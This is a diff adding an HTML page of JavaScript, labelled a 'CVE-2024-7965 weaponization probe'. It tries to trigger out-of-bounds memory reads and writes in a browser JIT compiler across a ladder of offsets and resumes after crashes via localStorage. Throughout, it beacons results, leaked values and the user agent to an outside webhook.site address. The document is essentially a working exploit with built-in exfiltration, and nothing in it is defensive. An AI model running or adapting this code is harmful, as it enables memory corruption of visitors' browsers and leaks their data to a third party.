@@ -1,0 +1,80 @@
+<html><body><script>
+// x1: CVE-2024-7965 weaponization probe
+//  - controllable far distance (constant baked as TF literal, C -> byte offset = C*4)
+//  - far READ attempt (leak) alongside the confirmed far WRITE
+//  - crash-resume via localStorage (renderer SIGSEGV -> webengine reload loop -> next distance)
+var SINK = 'https://webhook.site/049dead9-0020-41f4-83e7-942e265e5d6d';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,170)), {mode:'no-cors'}); } catch(e) {}
+}
+function save(i){ try { localStorage.setItem('x1i', String(i)); } catch(e){} }
+function load(){ try { return parseInt(localStorage.getItem('x1i') || '0', 10) || 0; } catch(e){ return 0; } }
+
+// exact shape of the arm64 PoC; C is inlined as a literal so TF keeps the constant path
+function mk(C){
+  var src = [
+    'var oob_array = new Array(5);',
+    'oob_array[0] = 0x500;',
+    'let just_a_variable = fake[0];',
+    'let another_variable3 = fake[7];',
+    'if (a % 7 == 0) another_variable3 = ' + C + ';',   // poison constant (>32 bit)
+    'another_variable3 = Math.max(another_variable3, tahir);',
+    'another_variable3 = another_variable3 >>> 0;',
+    'var index = fake[3];',
+    'var for_phi_modes = fake[6];',
+    'let c = fake[1];',
+    'for (var i = 0; i < 10; i++) {',
+    '  if (a % 3 == 0) just_a_variable = c;',
+    '  if (a % 37 == 0) just_a_variable = fake[2];',
+    '  if (a % 11 == 0) just_a_variable = fake[8];',
+    '  if (a % 17 == 0) just_a_variable = fake[5];',
+    '  if (a % 19 == 0) just_a_variable = fake[4];',
+    '  if (a % 7 == 0 && i >= 5) { for_phi_modes = just_a_variable; just_a_variable = another_variable3; }',
+    '  if (i >= 6) {',
+    '    for (let j = 0; j < 5; j++) {',
+    '      if (a % 5 == 0) {',
+    '        index = for_phi_modes;',
+    '        READ;',
+    '        WRITE;',
+    '      }',
+    '    }',
+    '  }',
+    '  for_phi_modes = c;',
+    '  c = just_a_variable;',
+    '}',
+    'return [index, just_a_variable, leaked];'
+  ].join('\n');
+  var body = src.replace('READ;', 'leaked = oob_array[index];').replace('WRITE;', 'oob_array[index] = 0x500;');
+  return new Function('a', body);
+}
+
+var fake = new Uint32Array(10);
+for (var i = 0; i < 10; i++) fake[i] = i + 1;
+var tahir = 0x1, leaked = -1, arrx = new Array(150); arrx[0] = 1.1;
+
+// byte offset = C * 4 ; sandbox is 1 TiB -> cover 16 GiB .. 1 TiB
+var LADDER = ['0x100000000','0x140000000','0x180000000','0x1C0000000','0x200000000','0x280000000','0x300000000','0x380000000','0x400000000','0x500000000','0x600000000','0x700000000','0x800000000','0xA00000000','0xC00000000','0x1000000000'];
+
+var k = load();
+beacon('start', 'x1 resume=' + k + '/' + LADDER.length + ' ua=' + navigator.userAgent.slice(62, 96));
+
+if (k < LADDER.length) {
+  save(k + 1);                       // persist BEFORE the risky work
+  var C = LADDER[k];
+  var T = mk(C);
+  // warm to TF without Maglev (deep warm-up required per prior device evidence)
+  for (var w = 2; w < 0x500; w++) T(w);
+  for (var w2 = 0; w2 < 50000; w2++) T(w2 % 500 + 2);
+  beacon('warm-done', k + ' C=' + C);
+  try {
+    leaked = -1;
+    var r = T(35);                   // a % 35 == 0: poison active + store/read taken
+    beacon('probe', k + ' C=' + C + ' idx=' + String(r[0]) + ' v=' + String(r[1]) + ' leak=' + String(leaked));
+  } catch (e) {
+    beacon('probe-exc', k + ' C=' + C + ' ' + String(e.name) + ':' + String(e.message).slice(0,40));
+  }
+  beacon('survived', k + ' C=' + C);
+} else {
+  beacon('done', 'x1-ladder-exhausted');
+}
+</script></body></html>
